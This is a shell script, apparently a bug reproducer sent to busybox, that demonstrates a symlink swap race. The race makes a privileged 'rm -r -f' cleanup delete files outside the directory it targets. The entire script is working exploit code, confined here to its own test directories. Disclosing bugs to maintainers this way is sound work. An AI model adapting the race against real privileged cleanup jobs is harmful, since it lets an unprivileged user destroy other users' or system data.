#!/bin/sh
#
# From: Sertonix via busybox <sertonix@posteo.net>
#

files=10000

# Dependencies:
# - util-linux: for exch
# - strace: for slowdown
# - busybox

while :; do
	rm -rf link private tmp

	mkdir -p tmp/subdir private
	for i in $(seq $files); do
		touch tmp/subdir/$i private/$i
	done
	{
		# Malicious process which only has access to create/change files in
		# tmp/
		ln -s ../private tmp/link
		while exch tmp/subdir tmp/link; do :; done
	} &
	pid=$!

	# (Privilidged) cleanup process like /etc/init.d/bootmisc:
	# strace and -v are only to slow down rm.
	# -f is to stop asking questions if rm is confused.
	strace -o slow-1 busybox rm -r -f -v tmp > slow-2

	kill -TERM "$pid" 2>/dev/null
	wait

	count=$(ls private | wc -l)
	if [ "$count" != "$files" ]; then
		printf 'It worked! %s of %s files left\n' "$count" "$files"
		break
	fi
done
